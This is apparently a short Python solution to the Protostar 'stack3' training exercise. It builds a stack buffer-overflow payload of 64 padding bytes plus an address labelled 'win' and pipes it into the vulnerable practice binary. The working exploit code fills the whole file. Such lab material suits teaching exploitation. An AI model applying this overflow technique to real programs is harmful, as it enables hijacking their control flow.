
import os

sploit = "A"*64 + "\x24\x84\x04\x08"
# 0x8048424 - win


with open("/tmp/stack3_sploit", "wb") as f:
	f.write(sploit)
os.system("/opt/protostar/bin/stack3 < /tmp/stack3_sploit")
os.remove("/tmp/stack3_sploit")

